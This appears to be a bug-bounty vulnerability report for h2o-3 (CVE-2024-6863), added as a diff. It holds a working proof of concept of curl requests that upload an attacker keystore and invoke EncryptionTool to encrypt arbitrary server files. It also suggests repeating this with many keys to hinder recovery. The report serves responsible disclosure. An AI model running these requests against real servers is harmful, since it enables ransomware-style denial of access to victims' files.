@@ -1,0 +1,50 @@
+Title: Encryption of arbitrary files with attacker-controlled key in h2oai/h2o-3
+
+Proof of Concept: 
+Create a new keystore by using the keytool-command. (bundled with Java):
+
+keytool -genseckey -alias key -keyalg AES -keystore keys -keysize 256 -storepass SOME_PASSWORD
+
+This outputs a keystore keys in the current working directory.
+
+Send the following request, replacing HOSTED_IP with the IP of the server:
+
+curl --location 'http://HOSTED_IP:54321/3/NodePersistentStorage.bin/some/file' --form 'value=@keys'
+
+This uploads the file keys from the current working directory to the server, using its temporary storage for NodePersistentStorage. In practice, the server defaults to placing this temporary storage in /home/USERNAME/h2oflows/*/*, so in this case the keystore will be uploaded to /home/USERNAME/h2oflows/some/file. Finding the username (or finding the path in general) can be done by using the typeahead API that h2o-3provides. (previously discussed in this report)
+
+Send the following request:
+
+curl --location 'http://localhost:54321/99/Rapids' --data-urlencode 'ast=(run_tool "EncryptionTool" ["/home/USERNAME/h2oflows/some/file", "PKCS12", "key", "SOME_PASSWORD", "AES", "/some/target/file/here", "/some/target/file/here"])'
+
+This encrypts the file at /some/target/file/here using the uploaded key. Be sure to change SOME_PASSWORD to be the same password as used in step 1. If not known, the path of what file to encrypt can be found by using the same typeahead API.
+
+Send the following request:
+
+curl --location 'http://HOSTED_IP:54321/3/NodePersistentStorage.bin/some/file' --form 'value= '
+
+This overwrites the uploaded keystore with an empty file.
+
+Repeat the above steps N times with N different keys, to make it difficult to recover all keys needed for decryption through e.g. memory inspection. (Optional)
+
+Impact: 
+This vulnerability makes it possible for an attacker to encrypt arbitrary files with keys of their choice. While limited to symmetric keys, it is still essentially possible to encrypt the files so that it is exceedingly difficult for the target to recover the keys needed for decryption.
+
+CVE ID: CVE-2024-6863
+Status: (assigned)
+Vulnerability Type: CWE-749: Exposed Dangerous Method or Function
+Severity: Medium (6.5)
+Attack Vector: Network
+Attack Complexity: Low
+Privileges Required: None
+User Interaction: None
+Scope: Unchanged
+Confidentiality: None
+Integrity: Low
+Availability: Low
+Registry: Other
+Affected Version: 3.46.0
+Visibility: Public
+Status: Awaiting fix
+Disclosure Bounty: $75
+Fix Bounty: $18.75
